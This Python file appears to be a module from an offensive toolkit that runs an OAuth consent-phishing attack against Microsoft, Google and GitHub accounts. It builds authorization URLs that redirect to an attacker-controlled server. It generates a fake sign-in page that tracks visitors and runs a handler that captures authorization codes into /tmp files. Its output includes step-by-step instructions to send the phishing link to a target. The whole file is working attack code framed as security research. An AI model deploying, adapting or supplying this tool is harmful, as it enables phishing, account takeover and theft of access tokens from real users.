#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
OAuth Exploitation Engine
Real OAuth misconfiguration attacks for security research
"""

import requests
import json
import time
import uuid
from urllib.parse import urlencode
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from typing import Dict, List, Any, Optional
import logging

logger = logging.getLogger(__name__)


class OAuthExploitEngine:
    """Real OAuth exploitation for security testing"""
    
    def __init__(self):
        self.config = {
            'kali_ip': '127.0.0.1',
            'port': 8084,
            'provider': 'microsoft',
            'target_client_id': None
        }
        
        self.stolen_tokens = {}
        self.active_sessions = {}
        self.server = None
        self.server_thread = None
        
        # OAuth provider configurations
        self.oauth_providers = {
            'microsoft': {
                'auth_endpoint': 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
                'token_endpoint': 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
                'scope': 'openid profile email User.Read',
                'client_id': '1950a258-227b-4e31-a9cf-717495945fc2'
            },
            'google': {
                'auth_endpoint': 'https://accounts.google.com/o/oauth2/v2/auth',
                'token_endpoint': 'https://oauth2.googleapis.com/token',
                'scope': 'openid profile email',
                'client_id': '32555940559.apps.googleusercontent.com'
            },
            'github': {
                'auth_endpoint': 'https://github.com/login/oauth/authorize',
                'token_endpoint': 'https://github.com/login/oauth/access_token',
                'scope': 'user repo admin:org',
                'client_id': 'Iv1.b507a08c87ecfe98'
            }
        }
    
    def set_parameter(self, name: str, value: Any):
        """Set configuration parameter"""
        if name in self.config:
            self.config[name] = value
            logger.info(f"Set {name} = {value}")
    
    def generate_oauth_attack_url(self, provider: str = None, target_client_id: str = None) -> tuple:
        """Generate OAuth attack URL"""
        provider = provider or self.config['provider']
        
        if provider not in self.oauth_providers:
            raise ValueError(f"Unknown provider: {provider}")
        
        provider_config = self.oauth_providers[provider]
        
        # Use provided client ID or default
        client_id = target_client_id or self.config.get('target_client_id') or provider_config['client_id']
        
        base_url = f"http://{self.config['kali_ip']}:{self.config['port']}"
        
        oauth_params = {
            'client_id': client_id,
            'redirect_uri': f'{base_url}/oauth/callback',
            'response_type': 'code',
            'scope': provider_config['scope'],
            'state': f'chromsploit_{uuid.uuid4().hex[:16]}',
        }
        
        # Provider-specific parameters
        if provider == 'microsoft':
            oauth_params.update({
                'prompt': 'consent',
                'access_type': 'offline'
            })
        elif provider == 'google':
            oauth_params.update({
                'access_type': 'offline',
                'prompt': 'consent'
            })
        elif provider == 'github':
            oauth_params.update({
                'allow_signup': 'true'
            })
        
        auth_url = f"{provider_config['auth_endpoint']}?{urlencode(oauth_params)}"
        
        # Store session
        self.active_sessions[oauth_params['state']] = {
            'provider': provider,
            'client_id': client_id,
            'created': time.time(),
            'redirect_uri': oauth_params['redirect_uri'],
            'status': 'waiting_for_code'
        }
        
        return auth_url, oauth_params['state']
    
    def generate_phishing_page(self, provider: str = None) -> str:
        """Generate OAuth phishing page"""
        provider = provider or self.config['provider']
        auth_url, state = self.generate_oauth_attack_url(provider)
        
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>{provider.title()} - Sign in</title>
    <meta charset="utf-8">
    <style>
        body {{ 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: #f5f5f5; 
            margin: 0; 
            padding: 50px; 
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .container {{ 
            max-width: 400px; 
            background: white; 
            padding: 40px; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
            font-weight: bold;
            color: #0078d4;
        }}
        .title {{ 
            font-size: 24px; 
            color: #1b1b1b; 
            margin-bottom: 10px; 
            text-align: center;
        }}
        .subtitle {{
            color: #666;
            margin-bottom: 30px;
            text-align: center;
        }}
        .oauth-btn {{ 
            background: #0078d4; 
            color: white; 
            padding: 15px 20px; 
            border: none; 
            border-radius: 4px; 
            width: 100%; 
            text-decoration: none; 
            display: block; 
            text-align: center;
            font-size: 16px;
            font-weight: 500;
            transition: background 0.2s;
        }}
        .oauth-btn:hover {{
            background: #106ebe;
        }}
        .security-notice {{
            margin-top: 20px;
            padding: 15px;
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            font-size: 14px;
            color: #856404;
        }}
        .provider-logo {{
            width: 20px;
            height: 20px;
            margin-right: 10px;
            vertical-align: middle;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">{provider.title()}</div>
        <h1 class="title">Sign in</h1>
        <p class="subtitle">to continue to your account</p>
        
        <a href="{auth_url}" class="oauth-btn">
            Continue with {provider.title()}
        </a>
        
        <div class="security-notice">
            <strong>Security Notice:</strong> This is a controlled security test. 
            Your credentials will be handled according to responsible disclosure practices.
        </div>
        
        <script>
            // Track page view
            fetch('/track', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{
                    event: 'page_view',
                    provider: '{provider}',
                    timestamp: Date.now(),
                    user_agent: navigator.userAgent,
                    state: '{state}'
                }})
            }});
        </script>
    </div>
</body>
</html>"""
    
    def start_server(self) -> bool:
        """Start OAuth phishing server"""
        try:
            self.server = HTTPServer((self.config['kali_ip'], self.config['port']), 
                                   OAuthHTTPHandler)
            self.server.exploit_instance = self
            
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            logger.info(f"OAuth exploit server started on {self.config['kali_ip']}:{self.config['port']}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to start OAuth server: {e}")
            return False
    
    def stop_server(self):
        """Stop OAuth server"""
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            if self.server_thread:
                self.server_thread.join()
            logger.info("OAuth exploit server stopped")
    
    def execute(self, target_url: str = None) -> Dict[str, Any]:
        """Execute OAuth exploitation"""
        try:
            if not self.start_server():
                return {'success': False, 'error': 'Failed to start server'}
            
            # Generate phishing page
            phishing_page = self.generate_phishing_page()
            
            # Save phishing page
            timestamp = int(time.time())
            payload_path = f"/tmp/oauth_phishing_{timestamp}.html"
            with open(payload_path, 'w') as f:
                f.write(phishing_page)
            
            # Generate OAuth attack URL
            auth_url, state = self.generate_oauth_attack_url()
            
            result = {
                'success': True,
                'exploit_type': 'OAuth',
                'payload_path': payload_path,
                'phishing_url': f"http://{self.config['kali_ip']}:{self.config['port']}",
                'oauth_url': auth_url,
                'state': state,
                'description': f'OAuth {self.config["provider"]} phishing attack ready',
                'instructions': [
                    f"1. Send phishing URL to target: http://{self.config['kali_ip']}:{self.config['port']}",
                    "2. Monitor server logs for OAuth callbacks",
                    "3. Captured tokens will be saved to /tmp/"
                ]
            }
            
            return result
            
        except Exception as e:
            logger.error(f"OAuth exploitation failed: {e}")
            return {'success': False, 'error': str(e)}
    
    def stop(self):
        """Stop the exploit"""
        self.stop_server()


class OAuthHTTPHandler(BaseHTTPRequestHandler):
    """HTTP handler for OAuth phishing server"""
    
    def log_message(self, format, *args):
        """Override to use our logger"""
        logger.info(f"OAuth Server: {format % args}")
    
    def do_GET(self):
        """Handle GET requests"""
        if self.path == '/':
            # Serve phishing page
            phishing_page = self.server.exploit_instance.generate_phishing_page()
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', len(phishing_page))
            self.end_headers()
            self.wfile.write(phishing_page.encode())
            
        elif self.path.startswith('/oauth/callback'):
            # Handle OAuth callback
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(self.path)
            query_params = parse_qs(parsed_url.query)
            
            code = query_params.get('code', [None])[0]
            state = query_params.get('state', [None])[0]
            error = query_params.get('error', [None])[0]
            
            if error:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(f"OAuth Error: {error}".encode())
                logger.error(f"OAuth callback error: {error}")
                return
            
            if code and state:
                # Store captured authorization code
                session_data = self.server.exploit_instance.active_sessions.get(state, {})
                session_data.update({
                    'code': code,
                    'captured_at': time.time(),
                    'status': 'code_captured'
                })
                
                # Save to file
                timestamp = int(time.time())
                filename = f"/tmp/oauth_capture_{timestamp}.json"
                with open(filename, 'w') as f:
                    json.dump({
                        'state': state,
                        'code': code,
                        'session': session_data,
                        'timestamp': timestamp
                    }, f, indent=2)
                
                logger.info(f"OAuth authorization code captured: {code[:20]}...")
                logger.info(f"OAuth data saved to: {filename}")
                
                # Send success response
                success_page = """
                <html>
                <head><title>Authorization Successful</title></head>
                <body>
                    <h2>Authorization completed successfully!</h2>
                    <p>You can close this window.</p>
                    <script>
                        setTimeout(() => window.close(), 3000);
                    </script>
                </body>
                </html>
                """
                
                self.send_response(200)
                self.send_header('Content-Type', 'text/html')
                self.end_headers()
                self.wfile.write(success_page.encode())
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b"Missing authorization code")
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        """Handle POST requests"""
        if self.path == '/track':
            # Handle tracking data
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            try:
                tracking_data = json.loads(post_data.decode())
                logger.info(f"OAuth Tracking: {tracking_data}")
                
                # Save tracking data
                timestamp = int(time.time())
                filename = f"/tmp/oauth_tracking_{timestamp}.json"
                with open(filename, 'w') as f:
                    json.dump(tracking_data, f, indent=2)
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"status": "tracked"}')
                
            except Exception as e:
                logger.error(f"OAuth tracking error: {e}")
                self.send_response(400)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()


def execute_exploit(parameters: Dict[str, Any]) -> Dict[str, Any]:
    """Execute OAuth exploit with given parameters"""
    exploit = OAuthExploitEngine()
    
    # Set parameters
    for key, value in parameters.items():
        exploit.set_parameter(key, value)
    
    # Execute
    return exploit.execute()